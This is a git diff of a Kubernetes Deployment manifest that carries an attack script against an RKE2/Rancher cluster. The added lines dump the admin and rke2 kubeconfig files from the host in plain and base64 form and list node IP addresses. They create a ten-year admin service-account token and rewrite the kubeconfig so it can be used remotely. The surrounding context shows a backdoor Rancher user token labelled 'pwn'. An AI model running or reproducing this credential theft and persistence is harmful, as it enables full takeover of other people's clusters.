@@ -1,3 +1,4 @@
+
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -52,7 +53,39 @@ spec:
 
             echo "############ [0] AUTH CHECK ############"
             kubectl $KC auth can-i '*' '*' 2>&1
-            kubectl $KC get nodes 2>&1 | head -5
+            kubectl $KC get nodes -o wide 2>&1
+
+            echo "############ [0b] NODES IP PUBBLICI ############"
+            kubectl $KC get nodes -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.status.addresses[] | select(.type=="InternalIP") | .address) + " | " + (.status.addresses[] | select(.type=="ExternalIP") // "none" | .address)' 2>&1
+
+            echo "############ [0c] ADMIN KUBECONFIG (YAML) ############"
+            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1
+            echo ""
+
+            echo "############ [0d] ADMIN KUBECONFIG (BASE64) ############"
+            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1 | base64 -w0
+            echo ""
+
+            echo "############ [0e] RKE2 KUBECONFIG (YAML) ############"
+            cat /host/etc/rancher/rke2/rke2.yaml 2>&1
+            echo ""
+
+            echo "############ [0f] RKE2 KUBECONFIG (BASE64) ############"
+            cat /host/etc/rancher/rke2/rke2.yaml 2>&1 | base64 -w0
+            echo ""
+
+            echo "############ [0g] ADMIN SA TOKEN (K8S) ############"
+            kubectl $KC create token admin-sa -n egam-production --duration=87600h 2>&1
+            echo ""
+
+            echo "############ [0h] ADMIN KUBECONFIG CON IP PUBBLICO ############"
+            ADMIN_KC=$(cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1 | base64 -w0)
+            NODE_IP=$(kubectl $KC get nodes -o json 2>&1 | jq -r '.items[0].status.addresses[] | select(.type=="InternalIP") | .address' 2>&1 | head -1)
+            echo "NODE_INTERNAL_IP=$NODE_IP"
+            echo "ADMIN_KC_BASE64_LEN=${#ADMIN_KC}"
+            echo "--- KUBECONFIG CON IP ---"
+            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1 | sed "s|https://127.0.0.1:6443|https://$NODE_IP:6443|g"
+            echo ""
 
             echo "############ [1] API RESOURCES RANCHER ############"
             kubectl $KC api-resources 2>&1 | grep -i "management.cattle.io" | head -20
@@ -114,7 +147,7 @@ spec:
             spec:
               description: pwn
               userId: user-pwnadmin
-              userPrincipalName: user-pwnadmin
+              userPrincipalName: "local://user-pwnadmin"
               ttl: 0
               enabled: true
               token: "$HASH"
